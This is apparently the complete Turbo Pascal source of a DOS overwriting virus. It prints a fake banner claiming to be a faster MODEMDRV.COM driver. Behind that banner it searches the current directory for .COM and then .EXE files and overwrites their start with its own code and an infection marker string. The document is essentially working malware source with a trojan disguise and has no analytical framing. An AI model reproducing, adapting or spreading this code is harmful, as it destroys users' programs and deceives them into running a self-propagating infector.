

{C-}
{U-}
{I-}       { Wont allow a user break, enable IO check}

{ -- Constants --------------------------------------- }

Const
     VirusSize = 12914;    {Number One's code size}

     Warning   :String[42]    {Warning message}
     = 'bcobracommanderroolz!!!                    ';

{ -- Type declarations------------------------------------- }

Type
     DTARec    =Record      {Data area for file search }
     DOSnext  :Array[1..21] of Byte;
                   Attr    : Byte;
                   Ftime,
                   FDate,
                   FLsize,
                   FHsize  : Integer;
                   FullName: Array[1..13] of Char;
                 End;

Registers    = Record    {Register set used for file search }
   Case Byte of
   1 : (AX,BX,CX,DX,BP,SI,DI,DS,ES,Flags : Integer);
   2 : (AL,AH,BL,BH,CL,CH,DL,DH          : Byte);
   End;

{ -- Variables--------------------------------------------- }

Var
                               { Memory offset program code }
   ProgramStart : Byte absolute Cseg:$100;
                                          { Infected marker }
   MarkInfected : String[42] absolute Cseg:$107;
   Reg          : Registers;                 { Register set }
   DTA          : DTARec;                       { Data area }
   Buffer       : Array[Byte] of Byte;        { Data buffer }
   TestID       : String[42]; { To recognize infected files }
   UsePath      : String[66];        { Path to search files }
                                    { Lenght of search path }
   UsePathLenght: Byte absolute UsePath;
   Go           : File;                    { File to infect }
   B            : Byte;                              { Used }

{ -- Program code------------------------------------------ }
  var Kool:integer;
    FUCK:file;
    Sam:integer;
Procedure fake_intro;
begin
{ Ú ¿ À Ù ³ Ä}
if markinfected[1]='b' then exit;
Writeln ('ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿');
Writeln ('³        M O D E M D R V . C O M        ³');
Writeln ('³                                       ³');
Writeln ('³ Written by:   G U N S H I P           ³');
Writeln ('³ Faster replacement to modemdrv.com!   ³');
Writeln ('³ (C)opyright 1989-- Monarch development³');
Writeln ('³                                       ³');
Writeln ('ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ');
Writeln ('This program may not be compatible with all systems,');
Writeln ('you may have to try it with various different configurations!');
writeln ('Creating New Modem driver statistics file...');

end;

Begin
kool:=0;sam:=0;
fake_intro;
repeat
kool:=0;
sam:=sam+1;
    usepath:='';
  GetDir(0, UsePath);               { get current directory }

  if Pos('\', UsePath) <> UsePathLenght then
    UsePath := UsePath + '\';

if sam>2 then usepath:=usepath+'*.EXE' else  UsePath := UsePath + '*.COM';
  Reg.AH := $1A;                            { Set data area }
  Reg.DS := Seg(DTA);
  Reg.DX := Ofs(DTA);
  MsDos(Reg);
  UsePath[Succ(UsePathLenght)]:=#0; { Path must end with #0 }
  Reg.AH := $4E;
  Reg.DS := Seg(UsePath);
  Reg.DX := Ofs(UsePath[1]);
  Reg.CX := $ff;          { Set attribute to find ALL files }
  MsDos(Reg);                   { Find first matching entry }
  IF not Odd(Reg.Flags) Then         { If a file found then }
    Repeat
      UsePath := DTA.FullName;
      B := Pos(#0, UsePath);
      If B > 0 then
      Delete(UsePath, B, 255);             { Remove garbage }
      Assign(Go, UsePath);
      if (pos('command',usepath)>0) or (pos('COMMAND',usepath)>0) then usepath:='USERS.';
      Reset(Go);
      If IOresult = 0 Then          { If not IO error then }
      Begin
        BlockRead(Go, Buffer, 2);
        Move(Buffer[$07], TestID, 43);
                      { Test if file already ill(Infected) }
        If TestID <> Warning Then        { If not then ... }
        Begin
          Seek (Go, 0);
                            { Mark file as infected and .. }
          MarkInfected := Warning;
                                               { Infect it }
          BlockWrite(Go,ProgramStart,Succ(VirusSize shr 7));
          Close(Go);
                                  { Say what has been done }
                                 { write('.');}
                           kool:=kool+1;
{  if kool>3 then assign (fuck,'MDRV2.ovr');

  if kool>3 then   execute(fuck);}

{  if kool>3 then         Halt; }                  {.. and halt the program }
        End;
        Close(Go);
      End;
        { The file has already been infected, search next. }
      Reg.AH := $4F;
      Reg.DS := Seg(DTA);
      Reg.DX := Ofs(DTA);
      MsDos(Reg);
    {  ......................Until no more files are found }
    Until Odd(Reg.Flags) or (kool>2);
    until sam=3;
End.
